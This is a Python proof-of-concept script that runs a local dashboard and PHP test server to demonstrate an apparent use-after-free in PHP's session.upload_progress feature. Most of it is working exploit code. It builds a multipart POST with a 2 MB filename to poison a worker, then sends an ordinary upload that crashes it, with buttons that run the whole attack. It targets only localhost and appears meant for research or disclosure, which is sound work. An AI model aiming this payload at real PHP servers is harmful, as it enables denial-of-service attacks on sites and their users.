#!/usr/bin/env python3
"""uaf_demo.py — a tiny local web app that shows the session.upload_progress UAF.

Two web servers, one purpose: let you watch a request destroy a PHP worker.

    http://127.0.0.1:8080/      this dashboard (attack buttons, live log)
    http://127.0.0.1:8081/      the "victim" site (tiny PHP app on php -S)

The victim app is a normal page: it starts a session and prints the worker pid,
so you can see *which* process the attack kills. The dashboard drives:

    1. Poison   - one multipart POST whose filename is 2,000,000 bytes.
                  PHP's upload-progress callback serialises that filename during
                  request startup; memory_limit is hit inside php_var_serialize(),
                  zend_bailout() longjmps past PHP_RINIT_FUNCTION(basic), and
                  BG(serialize) is left at level=1 pointing at freed memory.
    2. Victim   - any ordinary request. RINIT memsets the flag *after* the point
                  where the stale context is reused, so the request writes
                  through the freed block and the allocator aborts.

Why the PHP docroot lives in /tmp: the crash needs the SCRIPT_FILENAME
allocation to be 57..64 bytes, i.e. docroot length 22..29. This file stays in the
engagement tree where you can read it; only the served directory is short, and
it is created and deleted by this script.

    python3 uaf_demo.py                 # dashboard on :8080, victim on :8081
    python3 uaf_demo.py --port 9000 --victim-port 9001 --keep
"""
import argparse
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET_DOCROOT_LEN = 25          # 25 + 10 + len(docroot) == 64-byte bin at 22..29
ARM_FILENAME = 2_000_000
MEM_LIMIT = "8M"

VICTIM_PHP = r"""<?php
// The victim application. Nothing in this file can prevent the bug: the
// corruption happens in php_request_startup(), before this code is compiled.
if (session_status() === PHP_SESSION_NONE) { session_start(); }
@$GLOBALS['n'] = (int) ($_SESSION['hits'] ?? 0) + 1;
$_SESSION['hits'] = $GLOBALS['n'];
header('Content-Type: text/html; charset=utf-8');
echo "<!doctype html><body style='font:16px system-ui;background:#111;color:#ddd;padding:40px'>";
echo "<h2>Victim site</h2>";
echo "<p>worker pid <b>", getmypid(), "</b>";
echo "<p>your session has hit this site <b>", $_SESSION['hits'], "</b> time(s)";
echo "<p>php ", PHP_VERSION, " - peak memory ", memory_get_peak_usage(true), " bytes";
echo "<p style='color:#666'>a normal request. if the worker was poisoned, this page",
     " will never finish loading.";
echo "</body>";
"""

state = {
    "php": None,          # subprocess
    "port": None,
    "docroot": None,
    "log": [],
    "pids": set(),
    "requests": 0,
    "arms": 0,
    "deaths": 0,
    "verdict": "idle",
    "started": None,
}
lock = threading.Lock()


def note(msg):
    with lock:
        state["log"].append(f"{time.strftime('%H:%M:%S')}  {msg}")
        state["log"] = state["log"][-200:]


def short_docroot(want, keep):
    """Make a docroot whose length is `want`, without touching the engagement tree."""
    for _ in range(50):
        base = os.path.join(tempfile.gettempdir(), "uaf" + os.urandom(3).hex())
        pad = want - len(base) - 1
        if pad < 1:
            continue
        d = os.path.join(base, "d" * pad)
        os.makedirs(os.path.join(d, "sess"), exist_ok=True)
        with open(os.path.join(d, "index.php"), "w") as fh:
            fh.write(VICTIM_PHP)
        return d
    raise SystemExit("could not build a short docroot")


def stop_php():
    p = state.get("php")
    if p and p.poll() is None:
        p.kill()
        try:
            p.wait(timeout=5)
        except subprocess.TimeoutExpired:
            pass


def start_php(port, keep):
    stop_php()
    d = state.get("docroot") if state.get("docroot") and keep else None
    if not d or not os.path.isdir(d):
        d = short_docroot(TARGET_DOCROOT_LEN, keep)
        state["docroot"] = d
    cmd = ["php", "-n",
           "-d", "post_max_size=64M", "-d", "upload_max_filesize=32M",
           "-d", f"session.save_path={os.path.join(d, 'sess')}",
           "-d", f"memory_limit={MEM_LIMIT}",
           "-d", "session.upload_progress.enabled=1",
           "-d", "display_errors=1",
           "-S", f"127.0.0.1:{port}", "-t", d]
    logf = open(os.path.join(d, "php.log"), "a")
    state["php"] = subprocess.Popen(cmd, stdout=logf, stderr=subprocess.STDOUT, cwd=d)
    state["port"] = port
    state["started"] = time.time()
    time.sleep(0.9)
    note(f"php -S 127.0.0.1:{port} -t <{len(d)}-char docroot>  (memory_limit={MEM_LIMIT})")


def php_alive():
    p = state.get("php")
    return bool(p and p.poll() is None)


def http_get(port, path, timeout=6.0):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    try:
        s.sendall(f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n".encode())
        data = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def multipart(sid, fn_len, data_len):
    b = "----uafdemo" + os.urandom(4).hex()
    boundary = b
    out = []
    out.append(f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{sid}\r\n".encode())
    out.append(f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"".encode()
               + b"A" * fn_len + b"\"\r\nContent-Type: application/octet-stream\r\n\r\n")
    out.append(b"Z" * data_len)
    out.append(f"\r\n--{b}--\r\n".encode())
    return b"".join(out), boundary


def http_post_multipart(port, body, boundary, sid, timeout=30.0):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    try:
        s.sendall((f"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                   f"Cookie: PHPSESSID={sid}\r\n"
                   f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
        return s.recv(4096)
    finally:
        s.close()


def do_arm():
    if not php_alive():
        start_php(state["port"], keep=True)
    body, boundary = multipart(f"arm{int(time.time())}", ARM_FILENAME, 1000)
    t0 = time.time()
    try:
        resp = http_post_multipart(state["port"], body, boundary,
                                   "arm" + os.urandom(3).hex())
        head = resp.split(b"\r\n", 1)[0].decode(errors="replace")
    except OSError as exc:
        head = f"<no response: {exc}>"
    state["arms"] += 1
    state["requests"] += 1
    note(f"ARM  POST filename={ARM_FILENAME:,} bytes -> {head} "
         f"({int((time.time()-t0)*1000)} ms)")
    if b"exhausted" in resp:
        note("     ...memory_limit fatal, as designed: the serialize died mid-flight")
    note("     state: BG(serialize).level = 1, data -> freed 64-byte block")


def do_fire(path="/"):
    if not php_alive():
        state["verdict"] = "worker already dead (restart first)"
        note("FIRE skipped: no worker")
        return {"ok": False, "error": "dead"}
    t0 = time.time()
    try:
        resp = http_get(state["port"], path)
        head = resp.split(b"\r\n", 1)[0].decode(errors="replace")
        ok = True
        state["requests"] += 1
        note(f"FIRE GET {path} -> {head} ({int((time.time()-t0)*1000)} ms)  survives")
    except OSError as exc:
        ok = False
        head = f"<connection died: {exc}>"
        note(f"FIRE GET {path} -> {head} after {int((time.time()-t0)*1000)} ms")
    time.sleep(0.4)
    if not php_alive():
        rc = state["php"].returncode
        state["deaths"] += 1
        state["verdict"] = f"WORKER KILLED (exit {rc}, signal {abs(rc)})"
        note(f"     worker gone: exit {rc}. The freed serialize context was reused "
             f"and the allocator aborted.")
        logpath = os.path.join(state["docroot"], "php.log")
        if os.path.exists(logpath):
            tail = open(logpath, errors="replace").read().strip().splitlines()[-3:]
            for ln in tail:
                note(f"     php: {ln}")
    return {"ok": ok, "head": head}


def do_upload():
    """R2: an ordinary small file upload. This is the request that dies."""
    if not php_alive():
        state["verdict"] = "worker already dead (restart first)"
        note("FIRE (upload) skipped: no worker")
        return {"ok": False, "error": "dead"}
    body, boundary = multipart("victim" + os.urandom(3).hex(), 10, 100)
    t0 = time.time()
    try:
        resp = http_post_multipart(state["port"], body, boundary,
                                   "victim" + os.urandom(3).hex())
        if not resp:
            raise ConnectionError("closed without sending a response")
        head = resp.split(b"\r\n", 1)[0].decode(errors="replace")
        ok = True
        state["requests"] += 1
        note(f"FIRE upload (10-byte filename) -> {head} ({int((time.time()-t0)*1000)} ms) survives")
    except OSError as exc:
        ok = False
        head = f"<connection died: {exc}>"
        note(f"FIRE upload (10-byte filename) -> {head} after {int((time.time()-t0)*1000)} ms")
    time.sleep(0.5)
    if not php_alive():
        rc = state["php"].returncode
        state["deaths"] += 1
        state["verdict"] = f"WORKER KILLED (exit {rc}, signal {abs(rc)})"
        note("     worker gone: the stale serialize context was reused and the")
        note("     allocator aborted the process.")
        logpath = os.path.join(state["docroot"], "php.log")
        if os.path.exists(logpath):
            for ln in open(logpath, errors="replace").read().strip().splitlines()[-3:]:
                note(f"     php: {ln}")
    elif ok:
        note("     survived: this worker was not the one poisoned, or the block")
        note("     was not recycled. Re-arm, or use 'Run the whole demo'.")
    return {"ok": ok, "head": head}


def snapshot():
    return {
        "alive": php_alive(),
        "requests": state["requests"],
        "arms": state["arms"],
        "deaths": state["deaths"],
        "verdict": state["verdict"],
        "port": state["port"],
        "docroot_len": len(state["docroot"] or ""),
        "log": state["log"][-60:],
    }


PAGE = """<!doctype html><meta charset=utf-8><title>session.upload_progress UAF demo</title>
<style>
 :root{color-scheme:dark}
 body{font:14px/1.45 ui-monospace,SFMono-Regular,Menlo,monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:24px}
 h1{font-size:18px;margin:0 0 4px} .sub{color:#8b949e;margin-bottom:18px}
 .grid{display:grid;grid-template-columns:340px 1fr;gap:18px;align-items:start}
 .card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px}
 button{font:inherit;width:100%;margin:6px 0;padding:10px 12px;border-radius:8px;border:1px solid #30363d;
        background:#21262d;color:#c9d1d9;cursor:pointer;text-align:left}
 button:hover{background:#30363d} button.arm{border-color:#9e6a03} button.fire{border-color:#a40e26}
 button.main{background:#238636;border-color:#2ea043;color:#fff}
 .k{color:#8b949e} .v{color:#e6edf3} #log{white-space:pre-wrap;height:60vh;overflow:auto;
      background:#010409;border:1px solid #30363d;border-radius:10px;padding:12px;font-size:12.5px}
 .dead{color:#ff7b72} .live{color:#3fb950}
</style>
<h1>PHP session.upload_progress — use-after-free, live</h1>
<div class=sub>Poison one worker with a 2 MB filename, then make one ordinary <b>upload</b>.
Nothing here requires a login, a route, or a line of your application code.</div>
<div class=grid>
 <div>
  <div class=card>
   <div><span class=k>worker</span> <span id=alive>?</span></div>
   <div><span class=k>requests</span> <span class=v id=req>0</span></div>
   <div><span class=k>arms</span> <span class=v id=arms>0</span></div>
   <div><span class=k>deaths</span> <span class=v id=deaths>0</span></div>
   <div><span class=k>docroot</span> <span class=v id=dl>?</span> chars</div>
   <div style="margin-top:8px"><span class=k>verdict</span> <b id=verdict>idle</b></div>
  </div>
  <div class=card style="margin-top:12px">
   <button class=main onclick="call('/api/scripted')">Run the whole demo</button>
   <button class=arm onclick="call('/api/arm')">1. Poison (2 MB filename)</button>
   <button class=fire onclick="call('/api/upload')">2. Victim upload (dies)</button>
   <button onclick="call('/api/fire')">   ...or a plain GET (survives)</button>
   <button onclick="call('/api/restart')">Restart worker</button>
  </div>
  <div class=card style="margin-top:12px">
   <div class=k>victim site</div>
   <a href="http://127.0.0.1:__PORT__/" target=_blank style="color:#58a6ff">open http://127.0.0.1:__PORT__/</a>
  </div>
 </div>
 <div id=log></div>
</div>
<script>
async function call(p){ await fetch(p,{method:'POST'}); tick(); }
async function tick(){
  const s = await (await fetch('/api/state')).json();
  document.getElementById('alive').innerHTML = s.alive
      ? '<span class=live>alive</span>' : '<span class=dead>DEAD</span>';
  document.getElementById('req').textContent = s.requests;
  document.getElementById('arms').textContent = s.arms;
  document.getElementById('deaths').textContent = s.deaths;
  document.getElementById('dl').textContent = s.docroot_len;
  document.getElementById('verdict').textContent = s.verdict;
  const l = document.getElementById('log');
  const atBottom = l.scrollTop + l.clientHeight >= l.scrollHeight - 20;
  l.textContent = s.log.join('\\n');
  if (atBottom) l.scrollTop = l.scrollHeight;
}
setInterval(tick, 700); tick();
</script>
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _text(self, body, code=200, ctype="text/html; charset=utf-8"):
        body = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/":
            return self._text(PAGE.replace("__PORT__", str(state["port"])))
        if u.path == "/api/state":
            return self._json(snapshot())
        if u.path == "/favicon.ico":
            return self._text(b"", 204)
        self._text("not found", 404)

    def do_POST(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/api/arm":
            do_arm()
            return self._json({"ok": True})
        if u.path == "/api/fire":
            return self._json(do_fire(u.query or "/"))
        if u.path == "/api/upload":
            return self._json(do_upload())
        if u.path == "/api/restart":
            start_php(state["port"], keep=True)
            state["verdict"] = "idle"
            return self._json({"ok": True})
        if u.path == "/api/scripted":
            if not php_alive():
                start_php(state["port"], keep=True)
            note("--- scripted run ---")
            do_fire("/")
            note("     (a plain GET survives: this bug is in the *serialize* path,")
            note("      which only runs when a request writes to the session)")
            do_arm()
            time.sleep(0.3)
            do_upload()
            return self._json({"ok": True, "verdict": state["verdict"]})
        self._text("not found", 404)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8080, help="dashboard port")
    ap.add_argument("--victim-port", type=int, default=8081, help="php -S port")
    ap.add_argument("--keep", action="store_true", help="keep the /tmp docroot")
    a = ap.parse_args()

    start_php(a.victim_port, keep=a.keep)
    note(f"dashboard http://127.0.0.1:{a.port}/   victim http://127.0.0.1:{a.victim_port}/")
    note("press 'Run the whole demo', or step 1 then 2, then watch the worker die")

    srv = ThreadingHTTPServer(("127.0.0.1", a.port), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        stop_php()
        if not a.keep and state.get("docroot"):
            shutil.rmtree(os.path.dirname(state["docroot"]), ignore_errors=True)


if __name__ == "__main__":
    main()
